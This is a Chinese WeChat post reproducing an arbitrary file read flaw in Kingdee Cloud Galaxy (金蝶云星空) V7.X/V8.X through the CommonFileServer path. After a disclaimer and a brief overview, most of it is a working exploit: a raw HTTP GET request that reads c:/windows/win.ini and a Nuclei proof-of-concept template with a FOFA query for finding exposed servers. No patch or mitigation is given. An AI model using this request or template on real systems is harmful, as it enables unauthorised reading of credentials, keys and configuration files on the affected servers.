#  「漏洞复现」金蝶云星空 CommonFileServer 任意文件读取

rain  [ 知黑守白 ](javascript:void\(0\);)

**知黑守白** ![]()

微信号 gh_cfd31ff54692

功能介绍 黑白泾渭自分，弈棋尚能双活。知黑而守白，大道至简也！

____

___发表于_

收录于合集 #漏洞复现 20个

免责声明  

  

![]()

  

此内容仅供技术交流与学习，请勿用于未经授权的场景。请遵循相关法律与道德规范。任何因使用本文所述技术而引发的法律责任，与本文作者及发布平台无关。如有内容争议或侵权，请及时联系我们。谢谢！

![]()

![]()

漏洞概述  

![]()

      金蝶云星空V7.X、V8.X所有私有云和混合云版本存在一个通用漏洞，攻击者可利用此漏洞获取服务器上的任意文件，包括数据库凭据、API密钥、配置文件等，从而获取系统权限和敏感信息。

![]()

![]()

漏洞复现  

![]()

  *   *   *   *   *   *   * 

    
    
    GET /CommonFileServer/c:/windows/win.ini HTTP/1.1Host: accept: */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9  
    

![]()

  

![]()

NUCLEI POC  

![]()

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    id: jindie-K3-cloud-CommonFileServer-file-readinfo:  name: 金蝶云星空 CommonFileServer 任意文件读  author: rain  severity: critical  tags: Kingdee  metadata:     fofa-query: app="金蝶云星空-管理中心"http:  - raw:    - |        GET /CommonFileServer/c:/windows/win.ini HTTP/1.1        Host: mp.weixin.qq.com        Content-Type: application/x-www-form-urlencoded  
        matchers-condition: and    matchers:      - type: dsl        dsl:          - 'status_code == 200'          - 'contains(body, "[fonts]")'  
    

![]()

  

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

